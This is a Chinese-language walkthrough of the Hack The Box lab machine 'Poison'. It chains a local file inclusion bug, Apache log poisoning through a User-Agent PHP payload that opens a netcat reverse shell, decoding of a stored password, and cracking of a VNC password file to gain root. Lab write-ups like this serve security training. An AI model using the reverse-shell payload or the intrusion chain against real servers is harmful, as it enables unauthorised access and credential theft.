# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

探测开放端口
```
┌──(root💀kali)-[~/htb/Poison]
└─# nmap -p- 10.10.10.84 --open 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 21:11 EST
Nmap scan report for 10.10.10.84
Host is up (0.30s latency).
Not shown: 37616 filtered ports, 27917 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 161.63 seconds

```

端口服务详细信息
```
┌──(root💀kali)-[~/htb/Poison]
└─# nmap -sV -T4  -A -O 10.10.10.84 -p 22,80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 21:15 EST
Nmap scan report for 10.10.10.84
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (95%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.3-RELEASE (95%), FreeBSD 11.1-RELEASE (94%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   290.93 ms 10.10.14.1
2   290.23 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.96 seconds

```

## web

http服务有一个文件包含漏洞，输入文件的名字会包含这个文件，比如
```http://10.10.10.84/browse.php?file=phpinfo.php```

展示了phpinfo.php这个脚本的内容

我们猜测代码的形式是

```
$file = $_GET['file'];
include_once($file);
```

显然file这个参数是我们可以控制的，以下playload打印了```/etc/passwd```,证实存在文件包含漏洞

```http://10.10.10.84/browse.php?file=../../../../../etc/passwd```

```
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # 
root:*:0:0:Charlie &:/root:/bin/csh 
toor:*:0:0:Bourne-again Superuser:/root: 
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin 
operator:*:2:5:System &:/:/usr/sbin/nologin 
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin 
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin 
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin 
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin 
news:*:8:8:News Subsystem:/:/usr/sbin/nologin 
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin 
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin 
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin 
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin 
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin 
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin 
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin 
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin 
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin 
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico 
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin 
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin 
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin 
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin 
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin 
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin 
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin 
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin 
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin 
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin 
charix:*:1001:1001:charix:/home/charix:/bin/csh 
```

看到存在一个```charix```用户

文件包含漏洞拿shell一般要符合三个条件
1. web server存在文件解析漏洞
2. 文件包含漏洞
3. 可以读取web server日志 or 可以控制文件上传

具体例子查看[这篇文章](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)

apache版本是2.4.29，符合第一条，第2条我们已经证明存在。

现在只剩第三条，没有发现上传点。那么 只能查看web server日志，经过枚举，确认web server日志在```/var/log/httpd-access.log```

我们分析一下一条日志会记录哪些内容
```
"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.10.14.3 - - [30/Dec/2021:03:48:50 +0100] "GET /browse.php?file=../../../../../var/log/httpd-access.log HTTP/1.1" 200 3208001 "-
```

记录了浏览器引擎，来源IP，时间，用户输入，http版本等

经过测试，如果直接修改用户输入会被过滤，但是浏览器引擎是可以注入的

我们使用以下playload

```<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f'); ?>```

burpsuite请求头为：
```
GET /browse.php?file=%3C%3Fphp+echo+%27hi%27%3B+%3F%3E HTTP/1.1

Host: 10.10.10.84

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f'); ?> Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://10.10.10.84/

Upgrade-Insecure-Requests: 1
```

然后再打开```http://10.10.10.84/browse.php?file=../../../../../var/log/httpd-access.log```

拿到webshell
```
┌──(root💀kali)-[~/htb/Poison]
└─# nc -lnvp 4444                                                                                               1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.84] 16668
sh: can't access tty; job control turned off
$ id
uid=80(www) gid=80(www) groups=80(www)
$ whoami
www

```
## 提权到charix
在```/usr/local/www/apache24/data```找到一个加密密码文件
```
$ cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=

```

N次base64解密以后密码是:```Charix!2#4%6&8(0```

ssh登录```Charix```账号
```
└─# ssh charix@10.10.10.84       
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
RSA key fingerprint is SHA256:IZ4OMzVPPZx2SlxKP/M0k/XAN8A1D6UpXXHcuMlJZXQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (RSA) to the list of known hosts.
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
By pressing "Scroll Lock" you can use the arrow keys to scroll backward
through the console output.  Press "Scroll Lock" again to turn it off.
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
charix@Poison:~ % whoami
charix

```

# 提权
```charix```家目录下有个```secret.zip```文件

使用charix的ssh密码解密zip得到一个文件，但是好像无法阅读
```
┌──(root💀kali)-[~/htb/Poison]
└─# cat secret
��[|Ֆz!        
```

查看网络连接，发现开启了两个内部服务
```
charix@Poison:~ % netstat -an|grep LISTEN
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN

```

kali本地执行两条命令，转发这两个端口

> ssh -L 5801:127.0.0.1:5801 charix@10.10.10.84

> ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84


扫描本地5801,5901，查看服务信息
```
┌──(root💀kali)-[~/htb/Poison]
└─# nmap -sV -Pn 127.0.0.1 -p 5801,5901                                  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 03:01 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000064s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds

```

开了一个VNC服务。那么上面那个奇怪的文件有可能是VNC的加密密码

使用[这个脚本](https://github.com/jeroennijhof/vncpwd)破解上面的secret文件

```
┌──(root💀kali)-[~/htb/Poison/vncpwd]
└─# ./vncpwd /root/htb/Poison/secret       

Password: VNCP@$$!

```

使用下面命令登录```vncviewer localhost:5901```,输入明文密码

成功登录到root账号
```
┌──(root💀kali)-[~/htb/Poison]
└─# vncviewer localhost:5901                                                                                    1 ⨯
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding

```

后来发现，直接使用加密的```secret```文件也是可以登录的
```vncviewer -passwd /root/htb/Poison/secret 127.0.0.1::5901```

最后吐槽下，国内网络远程开vnc真是太慢了。。